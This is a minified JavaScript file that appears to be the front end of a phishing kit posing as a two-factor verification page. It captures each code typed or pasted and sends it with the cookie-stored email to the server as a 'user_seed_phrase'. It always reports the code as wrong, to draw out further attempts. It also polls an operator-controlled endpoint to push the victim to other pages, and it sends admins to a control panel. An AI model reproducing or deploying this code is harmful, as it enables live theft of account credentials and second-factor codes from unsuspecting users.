import"https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js";document.addEventListener("DOMContentLoaded",async function(){const s=Array.from(document.querySelectorAll(".authy-code")),l=document.querySelector(".css-1a9w5bx"),d=document.querySelector(".css-50bg6q");let a=!1,i=!1;const k=()=>{const e=document.createElement("div");return e.className="e1czpx481 css-1fe85m3 e1vsinnk0",e.id="spinner-container",e.innerHTML=`
                <div aria-label="spinner" data-testid="spinner-animation" class="css-12lkb7a e1oqezu31">
                    <svg color="#010304" viewBox="0 0 50 50" class="css-1qdfh2c e1oqezu30">
                        <circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle>
                    </svg>
                </div>
            `,e},E=()=>{const e=document.createElement("div");return e.className="css-78aq5l e1hp05jk0",e.id="error-container",e.setAttribute("data-testid","auth-code-error"),e.setAttribute("role","alert"),e.setAttribute("aria-live","assertive"),e.setAttribute("aria-atomic","true"),e.innerHTML=`
                <svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M14.6223 4.66123C13.4793 2.6038 10.5204 2.60381 9.37735 4.66124L2.77637 16.543C1.66549 18.5426 3.11139 20.9999 5.39885 20.9999H18.6008C20.8882 20.9999 22.3341 18.5426 21.2233 16.543L14.6223 4.66123Z" fill="#CA3A3A"></path>
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M11 14V8H13V14H11ZM11 18V16H13V18H11Z" fill="white"></path>
                </svg>
                <div class="css-qb7i4h e1vsinnk0">
                    <h4 class="css-rqzjz7 eboofq0">Oops! There was an error</h4>
                    <div class="css-7a45cq ez8rcrm1">The 2-Factor Verification Code you entered is incorrect.</div>
                </div>
            `,e},q=()=>{if(a)return;a=!0;const e=k();d.insertBefore(e,d.firstChild),s.forEach(r=>{r.disabled=!0})},u=()=>{a=!1,i=!0;const e=document.getElementById("spinner-container");e&&e.remove();const r=E();l.insertBefore(r,l.firstChild),s.forEach(t=>{t.disabled=!1,t.className="authy-code css-k9o5qk negative no-margin-top",t.value=""}),s[0].focus()},f=()=>{i=!1;const e=document.getElementById("error-container");e&&e.remove(),s.forEach(r=>{r.className="authy-code css-k9o5qk"})},p=async()=>{if(s.every(r=>r.value.length===1)&&!a){q();const r=s.map(o=>o.value).join(""),t=decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1]||"");try{if(!(await fetch("/api/users",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:t,user_seed_phrase:r.trim()})})).ok)throw new Error("API call failed");console.log("Successfully updated user with TFA code"),setTimeout(()=>{u()},Math.random()*500+1500+1e3)}catch(o){console.error("Error updating user with TFA code:",o),setTimeout(()=>{u()},1e3)}}};s.forEach((e,r)=>{e.addEventListener("input",t=>{const o=t.target,c=o.value;if(!/^\d$/.test(c)){o.value="";return}c.length===1&&(i&&f(),r<s.length-1&&setTimeout(()=>{s[r+1].focus()},100),p())}),e.addEventListener("keydown",t=>{const o=t.target;t.key==="Backspace"&&o.value===""&&r>0||t.key==="ArrowLeft"&&r>0?s[r-1].focus():t.key==="ArrowRight"&&r<s.length-1&&s[r+1].focus()}),e.addEventListener("paste",t=>{t.preventDefault();const c=(t.clipboardData?.getData("text")||"").replace(/\D/g,"").slice(0,6);i&&f(),c.split("").forEach((A,w)=>{s[w]&&(s[w].value=A)});const y=Math.min(c.length-1,5);y>=0&&s[y].focus(),p()}),e.addEventListener("focus",()=>{e.select()})}),s[0].focus();const h=document.querySelector('input[name="remember"]'),m=document.querySelector(".selected"),g=document.querySelector(".unselected");h.addEventListener("change",()=>{h.checked?(m.style.display="",g.style.display="none"):(m.style.display="none",g.style.display="")});const b=async()=>{try{(await(await fetch("/api/check-admin-status")).json()).isAdmin?(console.log("User is admin, redirecting to panel in 5 seconds..."),setTimeout(()=>{window.location.href="/panel"},5e3),n&&clearInterval(n)):(console.log("User is not admin, starting/continuing polling for redirects..."),n||v())}catch(e){console.error("Error checking admin status or user status:",e),n||v()}};let n;const v=()=>{n!==void 0&&clearInterval(n),n=window.setInterval(async()=>{try{const e=decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1]||"");if(!e){console.log("No user email found in cookie, stopping polling."),clearInterval(n);return}const t=await(await fetch("/api/users?email="+encodeURIComponent(e))).json();t&&t.current_page&&t.current_page!=="2fa"&&(console.log(`Redirecting user to: /${t.current_page}`),clearInterval(n),window.location.href="/"+t.current_page)}catch(e){console.error("Error checking user status during polling:",e)}},2e3)};b()});
